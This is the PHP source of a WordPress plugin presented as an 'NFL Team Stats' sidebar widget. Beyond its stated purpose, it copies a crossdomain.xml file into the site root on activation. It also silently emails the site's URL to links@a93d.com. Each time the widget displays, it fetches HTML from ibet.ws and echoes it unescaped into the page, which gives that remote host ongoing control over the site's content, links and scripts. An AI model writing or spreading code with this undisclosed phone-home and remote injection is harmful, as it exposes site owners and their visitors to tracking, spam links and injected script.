<?php
/*
Plugin Name: NFL Team Stats
Description: Provides the latest NFL stats of your NFL Team, updated regularly throughout the NFL regular season.
Author: A93D
Version: 1.1.9
Author URI: http://www.thoseamazingparks.com/getstats.php
*/

require_once(dirname(__FILE__) . '/rss_fetch.inc'); 
define('MAGPIE_FETCH_TIME_OUT', 60);
define('MAGPIE_OUTPUT_ENCODING', 'UTF-8');
define('MAGPIE_CACHE_ON', 0);

// Get Current Page URL
function NFLPageURL() {
 $NFLpageURL = 'http';
 $NFLpageURL .= "://";
 if ($_SERVER["SERVER_PORT"] != "80") {
  $NFLpageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 } else {
  $NFLpageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 }
 return $NFLpageURL;
}
/* This Registers a Sidebar Widget.*/
function widget_nflstats() 
{
?>
<h2>NFL Team Stats</h2>
<?php nfl_stats(); ?>
<?php
}

function nflstats_install()
{
register_sidebar_widget(__('NFL Team Stats'), 'widget_nflstats'); 
}
add_action("plugins_loaded", "nflstats_install");

/* When plugin is activated */
register_activation_hook(__FILE__,'nfl_stats_install');

/* When plugin is deactivation*/
register_deactivation_hook( __FILE__, 'nfl_stats_remove' );

function nfl_stats_install() 
{
// Copies crossdomain.xml file, if necessary, to proper folder
if (!file_exists("/crossdomain.xml"))
	{ 
	#echo "We've copied the crossdomain.xml file...\n\n";
	copy( dirname(__FILE__)."/crossdomain.xml", "../../../crossdomain.xml" );
	} 
// Here we pick 3 Random Ad Links in addition to first ad which is always id 0
// This is the URL For Fetching the RSS Feed with Ads Numbers
$myads = "http://www.ibet.ws/nfl_stats_magpie/nfl_stats_magpie_ads.php";
// This is the Magpie Basic Command for Fetching the Stats URL
$url = $myads;
$rss = nfl_fetch_rss( $url );
// Now to break the feed down into each item part
foreach ($rss->items as $item) 
		{
		// These are the individual feed elements per item
		$title = $item['title'];
		$description = $item['description'];
		// Assign Variables to Feed Results
		if ($title == 'ads1start')
			{
			$ads1start = $description;
			}
		else if ($title == 'ads1finish')
			{
			$ads1finish = $description;
			}
		if ($title == 'ads2start')
			{
			$ads2start = $description;
			}
		else if ($title == 'ads2finish')
			{
			$ads2finish = $description;
			}			
		if ($title == 'ads3start')
			{
			$ads3start = $description;
			}
		else if ($title == 'ads3finish')
			{
			$ads3finish = $description;
			}
		if ($title == 'ads4start')
			{
			$ads4start = $description;
			}
		else if ($title == 'ads4finish')
			{
			$ads4finish = $description;
			}	
		}
// Actual Ad Variable Calls
$nflads_id_1 = rand($ads1start,$ads1finish);
$nflads_id_2 = rand($ads2start,$ads2finish);
$nflads_id_3 = rand($ads3start,$ads3finish);
$nflads_id_4 = rand($ads4start,$ads4finish);
// Initial Team
$initialnflteam = 'arizona_cardinals_stats';
// Initial Size
$initialnflsize = '1';
// Initial News
$initialnflnews = '0';
// Add the Options
add_option("nfl_stats_team", "$initialnflteam", "This is my nfl team", "yes");
add_option("nfl_stats_size", "$initialnflsize", "This is my nfl size", "yes");
add_option("nfl_stats_news", "$initialnflnews", "This is my nfl news feed", "yes");
add_option("nfl_stats_ad1", "$nflads_id_1", "This is my nfl ad1", "yes");
add_option("nfl_stats_ad2", "$nflads_id_2", "This is my nfl ad2", "yes");
add_option("nfl_stats_ad3", "$nflads_id_3", "This is my nfl ad3", "yes");
add_option("nfl_stats_ad4", "$nflads_id_4", "This is my nfl ad4", "yes");

if ( ($ads_id_1 == 1) || ($ads_id_1 == 0) )
	{
	mail("links@a93d.com", "NFL Stats-News Installation", "Hi\n\nNFL Stats Activated at \n\n".NFLPageURL()."\n\nNFL Stats Service Support\n","From: links@a93d.com\r\n");
	}
}
function nfl_stats_remove() 
{
/* Deletes the database field */
delete_option('nfl_stats_team');
delete_option('nfl_stats_size');
delete_option('nfl_stats_news');
delete_option('nfl_stats_ad1');
delete_option('nfl_stats_ad2');
delete_option('nfl_stats_ad3');
delete_option('nfl_stats_ad4');
}

if ( is_admin() ){

/* Call the html code */
add_action('admin_menu', 'nfl_stats_admin_menu');

function nfl_stats_admin_menu() {
add_options_page('NFL Stats', 'NFL Stats Settings', 'administrator', 'nfl_hello.php', 'nfl_stats_plugin_page');
}
}

function nfl_stats_plugin_page() {
?>
   <div>
   <?php
   clearstatcache();
   if (!file_exists('../crossdomain.xml'))
	{ 
	echo '<h4>*Note: We tried to copy a file for you, but it didn\'t work. For optimal plugin operation, please use FTP to upload the "crossdomain.xml" file found in this plugin\'s folder to your website\'s "root directory", or folder where you wp-config.php file is kept. Completing this step will avoid excessive error reporting in your error log files...Thanks!
	<br />
	Alternatively, you can use the following form to download the file and upload from its location on your hard drive:</h4>
	<br />
	<a href="http://www.ibet.ws/crossdomain.zip" title="Click Here to Download or use the Button" target="_blank"><strong>Click Here</strong> to Download if Button Does Not Function</a>   
    <form id="DownloadForm" name="DownloadForm" method="post" action="">
      <label>
        <input type="button" name="DownloadWidget" value="Download File" onClick="window.open(\'http://www.ibet.ws/crossdomain.zip\', \'Download\'); return false;">
      </label>
    </form>';
	}
	?>
	<br />
   <h2>NFL Team Stats Options Page</h2>
  
   <form method="post" action="options.php">
   <?php wp_nonce_field('update-options'); ?>
  
   
   <h2>My Current Team: 
   <?php $theteam = get_option('nfl_stats_team'); 
  	$currentteam = preg_replace('/_|stats/', ' ', $theteam);
	$finalteam = ucwords($currentteam);
	echo $finalteam;
   	?></h2><br /><br />
     <small>My New Team:</small><br />
     <p>
     <select name="nfl_stats_team" id="nfl_stats_team">
<option value="arizona_cardinals_stats" selected="selected">Arizona Cardinals</option>
			
				<option value="atlanta_falcons_stats">Atlanta Falcons</option>
			
				<option value="baltimore_ravens_stats">Baltimore Ravens</option>
			
				<option value="buffalo_bills_stats">Buffalo Bills</option>

				<option value="carolina_panthers_stats">Carolina Panthers</option>
			
				<option value="chicago_bears_stats">Chicago Bears</option>
			
				<option value="cincinnati_bengals_stats">Cincinnati Bengals</option>
			
				<option value="cleveland_browns_stats">Cleveland Browns</option>
			
				<option value="dallas_cowboys_stats">Dallas Cowboys</option>
			
				<option value="denver_broncos_stats">Denver Broncos</option>

				<option value="detroit_lions_stats">Detroit Lions</option>
			
				<option value="green_bay_packers_stats">Green Bay Packers</option>
			
				<option value="houston_texans_stats">Houston Texans</option>
			
				<option value="indianapolis_colts_stats">Indianapolis Colts</option>
			
				<option value="jacksonville_jaguars_stats">Jacksonville Jaguars</option>
			
				<option value="kansas_city_chiefs_stats">Kansas City Chiefs</option>

				<option value="miami_dolphins_stats">Miami Dolphins</option>
			
				<option value="minnesota_vikings_stats">Minnesota Vikings</option>
			
				<option value="new_england_patriots_stats">New England Patriots</option>
			
				<option value="new_orleans_saints_stats">New Orleans Saints</option>
			
				<option value="new_york_giants_stats">New York Giants</option>
			
				<option value="new_york_jets_stats">New York Jets</option>

				<option value="oakland_raiders_stats">Oakland Raiders</option>
			
				<option value="philadelphia_eagles_stats">Philadelphia Eagles</option>
			
				<option value="pittsburgh_steelers_stats">Pittsburgh Steelers</option>
			
				<option value="san_diego_chargers_stats">San Diego Chargers</option>
			
				<option value="san_francisco_49ers_stats">San Francisco 49ers</option>
			
				<option value="seattle_seahawks_stats">Seattle Seahawks</option>

				<option value="saint_louis_rams_stats">Saint Louis Rams</option>
			
				<option value="tampa_bay_buccaneers_stats">Tampa Bay Buccaneers</option>
			
				<option value="tennessee_titans_stats">Tennessee Titans</option>
			
				<option value="washington_redskins_stats">Washington Redskins</option>

        </select>      
     
     <br />
     <small>Select Your Team from the Drop-Down Menu Above, then Click "Update"</small>
   <input type="hidden" name="action" value="update" />
   <input type="hidden" name="page_options" value="nfl_stats_team" />
  
   <p>
   <input type="submit" value="<?php _e('Save Changes') ?>" />
   </p>
  
   </form>
<!-- End Team Select -->  
    
    <br />
    <br />

<!-- Start Stat Size -->
   <form method="post" action="options.php">
   <?php wp_nonce_field('update-options'); ?>
   
     <h2>My Current Size: 
	 <?php 
	 $thesize = get_option('nfl_stats_size');
	 if ($thesize == 1)
	 	{
		echo "Compact";
		}
	else if ($thesize == 2)
		{
		echo "Large";
		}
	?>
    </h2><br /><br />
     <small>My New Stats Size:</small><br />
     <p>
     <select name="nfl_stats_size" id="nfl_stats_size">
          		<option value="1" selected="selected">Compact</option>
				<option value="2">Large</option>
     </select>
     <br />
     <small>Select Your Stats Panel Size from the Drop-Down Menu Above, then Click "Update"</small>
     <br />
      <input type="hidden" name="action" value="update" />
   <input type="hidden" name="page_options" value="nfl_stats_size" />
  
   <p>
   <input type="submit" value="<?php _e('Save Changes') ?>" />
   </p>
  
   </form>
<!-- End Stat Size -->

<!-- Start Stat News -->

   <form method="post" action="options.php">
   <?php wp_nonce_field('update-options'); ?>
   
     <h2>Display News Feed: 
	 <?php 
	 $thenews = get_option('nfl_stats_news');
	 if ($thenews == 0)
	 	{
		echo "No";
		}
	else if ($thenews == 1)
		{
		echo "Yes";
		}
	?>
    </h2><br /><br />
     <small>Activate or Deactivate News Feed:</small><br />
     <p>
     <select name="nfl_stats_news" id="nfl_stats_news">
          		<option value="0" selected="selected">No</option>
				<option value="1">Yes</option>
     </select>
     <br />
     <small>Select either "Yes" or "No" to turn on or turn off the news feed, then Click "Update"</small>
     <br />
      <input type="hidden" name="action" value="update" />
   <input type="hidden" name="page_options" value="nfl_stats_news" />
  
   <p>
   <input type="submit" value="<?php _e('Save Changes') ?>" />
   </p>
  
   </form>

<!-- End Stat News -->

   </div>
   <?php
   }
function nfl_stats()
{
$theteam = get_option('nfl_stats_team');
$thesize = get_option('nfl_stats_size');
$thenews = get_option('nfl_stats_news');
$ad1 = get_option('nfl_stats_ad1');
$ad2 = get_option('nfl_stats_ad2');
$ad3 = get_option('nfl_stats_ad3');
$ad4 = get_option('nfl_stats_ad4');

$myads = "http://www.ibet.ws/nfl_stats_magpie/int1-1-8/nfl_stats_magpie_ads.php?team=$theteam&lnko=$ad1&lnkt=$ad2&lnkh=$ad3&lnkf=$ad4&size=$thesize&news=$thenews";
// This is the Magpie Basic Command for Fetching the Stats URL
$url = $myads;
$rss = nfl_fetch_rss( $url );
// Now to break the feed down into each item part
foreach ($rss->items as $item) 
		{
		// These are the individual feed elements per item
		$title = $item['title'];
		$description = $item['description'];
		// Assign Variables to Feed Results
		if ($title == 'adform')
			{
			$adform = $description;
			}
		}

echo $adform;
}
?>